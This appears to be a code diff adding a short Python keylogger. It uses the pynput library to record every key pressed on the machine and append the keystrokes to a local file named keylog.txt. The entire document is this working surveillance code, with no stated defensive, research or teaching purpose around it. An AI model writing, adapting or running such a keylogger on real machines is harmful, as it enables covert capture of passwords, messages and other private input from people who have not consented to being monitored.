@@ -1,0 +1,18 @@
+import pynput
+
+log = ""
+
+def on_press(key):
+    global log
+    try:
+        log += key.char
+    except AttributeError:
+        log += f" {key} "
+
+    with open("keylog.txt", "a") as log_file:
+        log_file.write(log)
+        log = ""
+
+listener = pynput.keyboard.Listener(on_press=on_press)
+listener.start()
+listener.join()
